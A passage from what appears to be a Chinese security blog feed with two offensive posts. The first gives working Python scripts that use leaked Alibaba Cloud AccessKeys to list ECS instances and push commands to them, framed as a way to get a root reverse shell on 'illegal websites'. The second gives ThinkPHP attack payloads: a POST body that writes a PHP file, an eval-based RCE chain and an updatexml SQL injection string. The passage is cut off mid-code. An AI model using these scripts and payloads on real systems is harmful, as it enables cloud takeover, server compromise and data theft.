punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">for</span> Instance <span class="token keyword">in</span> response<span class="token punctuation">[</span><span class="token string">'Instances'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'Instance'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> Instance<span class="token punctuation">[</span><span class="token string">'VpcAttributes'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                priip <span class="token operator">=</span> Instance<span class="token punctuation">[</span><span class="token string">'VpcAttributes'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'PrivateIpAddress'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'IpAddress'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>            priip <span class="token operator">=</span> <span class="token string">'无'</span>        <span class="token keyword">if</span> Instance<span class="token punctuation">[</span><span class="token string">'PublicIpAddress'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                pubip <span class="token operator">=</span> Instance<span class="token punctuation">[</span><span class="token string">'PublicIpAddress'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'IpAddress'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>                pubip <span class="token operator">=</span> <span class="token string">'无'</span>        <span class="token keyword">if</span> Instance<span class="token punctuation">[</span><span class="token string">'InstanceName'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            insname <span class="token operator">=</span> Instance<span class="token punctuation">[</span><span class="token string">'InstanceName'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> Instance<span class="token punctuation">[</span><span class="token string">'OSName'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            osname <span class="token operator">=</span> Instance<span class="token punctuation">[</span><span class="token string">'OSName'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> Instance<span class="token punctuation">[</span><span class="token string">'InstanceId'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            insId <span class="token operator">=</span> Instance<span class="token punctuation">[</span><span class="token string">'InstanceId'</span><span class="token punctuation">]</span>        res <span class="token operator">=</span> <span class="token string">'主机名称:{}&lt;--->操作系统:{}&lt;--->内网IP:{}&lt;--->公网IP:{}&lt;--->网络@{}&lt;--->InstanceId:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>insname<span class="token punctuation">,</span> osname<span class="token punctuation">,</span>str<span class="token punctuation">(</span>priip<span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>pubip<span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>RegionId<span class="token punctuation">)</span><span class="token punctuation">,</span>insId<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span></code></pre><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/6/4.png" alt="" loading="lazy"></p><ol start="2"><li>使用CreateCommand新建一条云助手命令（CreateCommand.py）</li></ol><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/6/5.png" alt="" loading="lazy"></p><p>RegionId代表区域；Name为命令名称，支持全字符集，长度不得超过128个字符；</p><p>Type为命令的类型：</p><pre><code>RunBatScript：创建一个在Windows实例中运行的 Bat 脚本。 RunPowerShellScript：创建一个在Windows实例中运行的PowerShell脚本。 RunShellScript：创建一个在Linux实例中运行的Shell脚本。</code></pre><p>CommandContent为需要执行的命令，base64进行传输的，一般不超过16k</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">import</span> base64<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>client <span class="token keyword">import</span> AcsClient<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ClientException<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ServerException<span class="token keyword">from</span> aliyunsdkecs<span class="token punctuation">.</span>request<span class="token punctuation">.</span>v20140526<span class="token punctuation">.</span>CreateCommandRequest <span class="token keyword">import</span> CreateCommandRequestclient <span class="token operator">=</span> AcsClient<span class="token punctuation">(</span><span class="token string">'LTxxxxxx'</span><span class="token punctuation">,</span> <span class="token string">'Xxxxxxxxnxxxxxx'</span><span class="token punctuation">,</span> <span class="token string">'cn-hangzhou'</span><span class="token punctuation">)</span>request <span class="token operator">=</span> CreateCommandRequest<span class="token punctuation">(</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_accept_format<span class="token punctuation">(</span><span class="token string">'json'</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_Name<span class="token punctuation">(</span><span class="token string">"test1"</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_Type<span class="token punctuation">(</span><span class="token string">"RunShellScript"</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_CommandContent<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token string">'需要执行的命令'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>response <span class="token operator">=</span> client<span class="token punctuation">.</span>do_action_with_exception<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>执行脚本输出</p><pre><code>{&quot;RequestId&quot;:&quot;C5A79885-6377-4785-86C6-9CA7FCXXXXX&quot;,&quot;CommandId&quot;:&quot;c-hz0xxxx&quot;}</code></pre><ol start="3"><li>利用DescribeCommands查询您已经创建的云助手命令（DescribeCommands.py）</li></ol><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/6/6.png" alt="" loading="lazy"></p><p>CommandId为CreateCommand脚本执行返回的结果</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>client <span class="token keyword">import</span> AcsClient<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ClientException<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ServerException<span class="token keyword">from</span> aliyunsdkecs<span class="token punctuation">.</span>request<span class="token punctuation">.</span>v20140526<span class="token punctuation">.</span>DescribeCommandsRequest <span class="token keyword">import</span> DescribeCommandsRequestclient <span class="token operator">=</span> AcsClient<span class="token punctuation">(</span><span class="token string">'&lt;accessKeyId>'</span><span class="token punctuation">,</span> <span class="token string">'&lt;accessSecret>'</span><span class="token punctuation">,</span> <span class="token string">'cn-hangzhou'</span><span class="token punctuation">)</span>request <span class="token operator">=</span> DescribeCommandsRequest<span class="token punctuation">(</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_accept_format<span class="token punctuation">(</span><span class="token string">'json'</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_CommandId<span class="token punctuation">(</span><span class="token string">"c-hz0xxxxx"</span><span class="token punctuation">)</span>response <span class="token operator">=</span> client<span class="token punctuation">.</span>do_action_with_exception<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># python2:  print(response) </span><span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><ol start="4"><li>利用InvokeCommand为一台或多台ECS实例触发一条云助手命令（InvokeCommand.py）</li></ol><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/6/7.png" alt="" loading="lazy"></p><p>CommandId为CreateCommand脚本执行返回的结果，InstanceId为需要执行命令的实例列表，就是上面第一个脚本获取到的InstanceId</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>client <span class="token keyword">import</span> AcsClient<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ClientException<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ServerException<span class="token keyword">from</span> aliyunsdkecs<span class="token punctuation">.</span>request<span class="token punctuation">.</span>v20140526<span class="token punctuation">.</span>InvokeCommandRequest <span class="token keyword">import</span> InvokeCommandRequestclient <span class="token operator">=</span> AcsClient<span class="token punctuation">(</span><span class="token string">'LTxxxxxx'</span><span class="token punctuation">,</span> <span class="token string">'Xxxxxxxx'</span><span class="token punctuation">,</span> <span class="token string">'cn-hangzhou'</span><span class="token punctuation">)</span>request <span class="token operator">=</span> InvokeCommandRequest<span class="token punctuation">(</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_accept_format<span class="token punctuation">(</span><span class="token string">'json'</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_CommandId<span class="token punctuation">(</span><span class="token string">"c-hz0uxxxxx"</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_InstanceIds<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"i-bp1xxxxxxx"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>response <span class="token operator">=</span> client<span class="token punctuation">.</span>do_action_with_exception<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>只需要将CreateCommand.py脚本的命令换成反弹shell的命令，在利用InvokeCommand执行命令就可以反弹一个最高权限的shell。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在渗透测试非法网站中，很多站都是在阿里云，亚马逊云搭建的站点。而阿里云AccessKey的泄露根用户权限大可以直接接管ECS，AWS则是有限制的，不是根用户是通过IAM来创建的用户，访问S3，EC2是分了权限控制的。在渗透测试中获取AccessKey的思路：github泄露
      
    
    </summary>
    
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>关于ThinkPHP的一些渗透方式</title>
    <link href="http://yoursite.com/2020/08/17/%E5%85%B3%E4%BA%8EThinkPHP%E7%9A%84%E4%B8%80%E4%BA%9B%E6%B8%97%E9%80%8F%E6%96%B9%E5%BC%8F/"/>
    <id>http://yoursite.com/2020/08/17/%E5%85%B3%E4%BA%8EThinkPHP%E7%9A%84%E4%B8%80%E4%BA%9B%E6%B8%97%E9%80%8F%E6%96%B9%E5%BC%8F/</id>
    <published>2020-08-16T16:00:00.000Z</published>
    <updated>2020-08-17T09:29:35.804Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Runtime日志"><a href="#Runtime日志" class="headerlink" title="Runtime日志"></a><strong>Runtime日志</strong></h4><p>在ThinkPHP3的版本中，入口文件index.php是跟应用目录，框架目录是同一个目录下的，在DEBUG开启的状态下，会在runtime生成日志文件，会泄露一些管理员登录后台的账号密码等。tp3的日志文件命名规则为：根目录(或者应用目录)/Runtime/Logs/Admin/20_08_17.log（年份前2位_月份_日.log）</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/1.png" alt="" loading="lazy"></p><p>在tp5的版本中，入口文件index是在public的目录下，它跟应用目录，框架目录不在同一个目录，但是有些管理员会将入口文件放置到跟应用目录，框架目录同目录，tp5的命名规则为：./runtime/log/202008/17.log（./runtime/log/年月/日.log）</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/2.png" alt="" loading="lazy"></p><h4 id="file-put-contents函数"><a href="#file-put-contents函数" class="headerlink" title="file_put_contents函数"></a><strong>file_put_contents函数</strong></h4><p>在thinkphp3中，后台有很多时候都会有写入配置文件来getshell的，所以我总是喜欢全局查找这个file_put_contents这个函数，然后我在网上找了个代码–yershop(TP3开发的那个版本)来进行审计，后台可以通过写入文件来拿shell。全局查找file_put_contents函数，发现控制器AddonsController.class.php中的build存在</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/2/4.png" alt="" loading="lazy"></p><p>发现存在两处写入文件，这里第一处需要满足以下条件：</p><pre><code>$addon_dir可控,$data可控,$addonModel可控</code></pre><p>第二处需要满足：</p><pre><code>$data[&#39;has_config&#39;] == 1,$addon_dir可控</code></pre><p>跟踪发现$data是从全局POST获取的，所有可控，即$addon_dir可控</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/2/5.png" alt="" loading="lazy"></p><p>构造payload如下，后台创建扩展</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/2/6.png" alt="" loading="lazy"></p><p>点击确定，抓包，首先会判断标识名这个插件是否存在，不存在就执行build访问</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/2/7.png" alt="" loading="lazy"></p><p>由于要写入config.php这个文件需要满足$data[‘has_config’] == 1，最后构造payload</p><p>访问：index.php?s=/Admin/Addons/build.html              POST发送：</p><pre><code>info%5Bname%5D=Example&amp;info%5Btitle%5D=%E7%A4%BA%E5%88%97&amp;info%5Bversion%5D=0.1&amp;info%5Bauthor%5D=%E6%97%A0%E5%90%8D&amp;info%5Bdescription%5D=%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E4%B8%B4%E6%97%B6%E6%8F%8F%E8%BF%B0&amp;info%5Bstatus%5D=1&amp;config=%3C%3Fphp%0D%0Areturn+array(%0D%0A%09&#39;random&#39;%3D%3Earray(%2F%2F%E9%85%8D%E7%BD%AE%E5%9C%A8%E8%A1%A8%E5%8D%95%E4%B8%AD%E7%9A%84%E9%94%AE%E5%90%8D+%2C%E8%BF%99%E4%B8%AA%E4%BC%9A%E6%98%AFconfig%5Brandom%5D%0D%0A%09%09&#39;title&#39;%3D%3E&#39;%E6%98%AF%E5%90%A6%E5%BC%80%E5%90%AF%E9%9A%8F%E6%9C%BA%3A&#39;%2C%2F%2F%E8%A1%A8%E5%8D%95%E7%9A%84%E6%96%87%E5%AD%97%0D%0A%09%09&#39;type&#39;%3D%3E&#39;radio&#39;%2C%09%09+%2F%2F%E8%A1%A8%E5%8D%95%E7%9A%84%E7%B1%BB%E5%9E%8B%EF%BC%9Atext%E3%80%81textarea%E3%80%81checkbox%E3%80%81radio%E3%80%81select%E7%AD%89%0D%0A%09%09&#39;options&#39;%3D%3Earray(%09%09+%2F%2Fselect+%E5%92%8Cradion%E3%80%81checkbox%E7%9A%84%E5%AD%90%E9%80%89%E9%A1%B9%0D%0A%09%09%09&#39;1&#39;%3D%3E&#39;%E5%BC%80%E5%90%AF&#39;%2C%09%09+%2F%2F%E5%80%BC%3D%3E%E6%96%87%E5%AD%97%0D%0A%09%09%09&#39;0&#39;%3D%3E&#39;%E5%85%B3%E9%97%AD&#39;%2C%0D%0A%09%09)%2C%0D%0A%09%09&#39;value&#39;%3D%3E&#39;1&#39;%2C%09%09%09+%2F%2F%E8%A1%A8%E5%8D%95%E7%9A%84%E9%BB%98%E8%AE%A4%E5%80%BC%0D%0A%09)%2C%0D%0A)%3B%0D%0A%09%09%09%09%09&amp;custom_config=&amp;admin_list=&#39;model&#39;%3D%3E&#39;Example&#39;%2C%09%09%2F%2F%E8%A6%81%E6%9F%A5%E7%9A%84%E8%A1%A8%0D%0A%09%09%09&#39;fields&#39;%3D%3E&#39;*&#39;%2C%09%09%09%2F%2F%E8%A6%81%E6%9F%A5%E7%9A%84%E5%AD%97%E6%AE%B5%0D%0A%09%09%09&#39;map&#39;%3D%3E&#39;&#39;%2C%09%09%09%09%2F%2F%E6%9F%A5%E8%AF%A2%E6%9D%A1%E4%BB%B6%2C+%E5%A6%82%E6%9E%9C%E9%9C%80%E8%A6%81%E5%8F%AF%E4%BB%A5%E5%86%8D%E6%8F%92%E4%BB%B6%E7%B1%BB%E7%9A%84%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95%E9%87%8C%E5%8A%A8%E6%80%81%E9%87%8D%E7%BD%AE%E8%BF%99%E4%B8%AA%E5%B1%9E%E6%80%A7%0D%0A%09%09%09&#39;order&#39;%3D%3E&#39;id+desc&#39;%2C%09%09%2F%2F%E6%8E%92%E5%BA%8F%2C%0D%0A%09%09%09&#39;list_grid&#39;%3D%3Earray(+%09%09%2F%2F%E8%BF%99%E9%87%8C%E5%AE%9A%E4%B9%89%E7%9A%84%E6%98%AF%E9%99%A4%E4%BA%86id%E5%BA%8F%E5%8F%B7%E5%A4%96%E7%9A%84%E8%A1%A8%E6%A0%BC%E9%87%8C%E5%AD%97%E6%AE%B5%E6%98%BE%E7%A4%BA%E7%9A%84%E8%A1%A8%E5%A4%B4%E5%90%8D%E5%92%8C%E6%A8%A1%E5%9E%8B%E4%B8%80%E6%A0%B7%E6%94%AF%E6%8C%81%E5%87%BD%E6%95%B0%E5%92%8C%E9%93%BE%E6%8E%A5%0D%0A++++++++++++++++&#39;cover_id%7Cpreview_pic%3A%E5%B0%81%E9%9D%A2&#39;%2C%0D%0A++++++++++++++++&#39;title%3A%E4%B9%A6%E5%90%8D&#39;%2C%0D%0A++++++++++++++++&#39;description%3A%E6%8F%8F%E8%BF%B0&#39;%2C%0D%0A++++++++++++++++&#39;link_id%7Cget_link%3A%E5%A4%96%E9%93%BE&#39;%2C%0D%0A++++++++++++++++&#39;update_time%7Ctime_format%3A%E6%9B%B4%E6%96%B0%E6%97%B6%E9%97%B4&#39;%2C%0D%0A++++++++++++++++&#39;id%3A%E6%93%8D%E4%BD%9C%3A%5BEDIT%5D%7C%E7%BC%96%E8%BE%91%2C%5BDELETE%5D%7C%E5%88%A0%E9%99%A4&#39;%0D%0A++++++++++++)%2C%0D%0A%09%09%09%09%09&amp;custom_adminlist=&amp;has_config=1&amp;config=&lt;?php phpinfo();?&gt;</code></pre><p>成功写入config.php文件，访问Addons/Example/config.php</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/2/8.png" alt="" loading="lazy"></p><p>所以，在TP3开发的源码中，全局查找file_put_contents很容易中奖。</p><h4 id="Auth引发的RCE"><a href="#Auth引发的RCE" class="headerlink" title="Auth引发的RCE"></a><strong>Auth引发的RCE</strong></h4><p>在tp3中，在Auth的getAuthList方法存在eval函数，跟进代码ThinkPHP\Library\Think\Auth.class.php</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/7.png" alt="" loading="lazy"></p><p>这里需要满足$command变量可控就可以rce了，$command为[表前缀]_auth_rule的condition字段，这里我还是以yershop源码来分析，控制权限的表为yershop_auth_rule。</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/8.png" alt="" loading="lazy"></p><p>所以，漏洞触发需要向condition字段写入我们的恶意代码，要利用注入且支持pdo就能写入进去，tp3是以pdo来连接数据库的，这里满足了pdo，就需要寻找注入点来getshell了。</p><p>在文件Application\Home\Controller\OrderController.class.php中的detail方法，通过<strong>I</strong>方法获取id参数。</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/9.png" alt="" loading="lazy"></p><p>利用pdo修改condition字段</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/10.png" alt="" loading="lazy"></p><p>继续分析，是怎么调用到getAuthList这个方法的，在Application\Admin\Controller\AdminController.class.php控制器中，调用了checkRule方法，在checkRule方法实列了Auth类，并调用了check方法。</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/11.png" alt="" loading="lazy"></p><p>跟进check方法</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/12.png" alt="" loading="lazy"></p><p>在104行调用了我们的getAuthList方法，执行到了eval函数处。要触发rce，从代码中可以看到需要普通用户的权限才会执行到checkRule方法，所以先添加一个新用户并新增一个用户组，给它文章管理的权限。</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/13.png" alt="" loading="lazy"></p><p>登录这个用户，访问我们注入修改的路由，成功rce</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/14.png" alt="" loading="lazy"></p><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a><strong>SQL注入</strong></h4><p>在TP3.1.3和TP3.2.3注入都差不多，无非就表达式注入，bind注入，find/select/delete注入，order注入，在之前的<a href="https://bbs.ichunqiu.com/thread-56035-1-1.html" target="_blank" rel="noopener">文章</a>中，分析过关于tp3.2.3的注入，这里我就不在多说了。这里主要是TP5的注入。</p><h5 id="ThinkPHP-lt-5-0-16-insert-update注入"><a href="#ThinkPHP-lt-5-0-16-insert-update注入" class="headerlink" title="ThinkPHP&lt;=5.0.16 insert/update注入"></a><strong>ThinkPHP&lt;=5.0.16 insert/update注入</strong></h5><p>在ThinkPHP5中，获取请求方式的方法是input，在控制器中，写个存在漏洞的demo</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getuser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">input</span><span class="token punctuation">(</span><span class="token string">'get.username/a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">db</span><span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'uid'</span><span class="token operator">=</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$username</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dump</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>漏洞payload</p><pre><code>username[0]=dec&amp;username[1]=updatexml(1,concat(0x7e,user(),0x7e),1)&amp;username[2]=1</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/17.png" alt="" loading="lazy"></p><p>在user变量处，断点进行分析，直接进入update方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/18.png" alt="" loading="lazy"></p><p>继续跟进$this-&gt;builder-&gt;update</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/19.png" alt="" loading="lazy"></p><p>在parseData方法中，进行了sql语句的拼接</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/20.png" alt="" loading="lazy"></p><p>当参数传入数组的时候，下标0为exp时候，直接返回下标为1的参数值，而为inc或者dec时候，通过parseKey方法处理了下标为1的参数值，跟进查看parseKey方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">parseKey</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token string">'$.'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token boolean">false</span> <span class="token operator">===</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token string">'('</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// JSON字段支持</span>            <span class="token function">list</span><span class="token punctuation">(</span><span class="token variable">$field</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'$.'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$key</span>                <span class="token operator">=</span> <span class="token string">'json_extract('</span> <span class="token punctuation">.</span> <span class="token variable">$field</span> <span class="token punctuation">.</span> <span class="token string">', \'$.'</span> <span class="token punctuation">.</span> <span class="token variable">$name</span> <span class="token punctuation">.</span> <span class="token string">'\')'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[,\'\"\(\)`\s]/'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">list</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">'__TABLE__'</span> <span class="token operator">==</span> <span class="token variable">$table</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">query</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getTable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'alias'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$table</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'alias'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$table</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[,\'\"\*\(\)`.\s]/'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string">'`'</span> <span class="token punctuation">.</span> <span class="token variable">$key</span> <span class="token punctuation">.</span> <span class="token string">'`'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">'`.`'</span><span class="token punctuation">,</span> <span class="token variable">$table</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string">'`'</span> <span class="token punctuation">.</span> <span class="token variable">$table</span> <span class="token punctuation">.</span> <span class="token string">'`.'</span> <span class="token punctuation">.</span> <span class="token variable">$key</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token 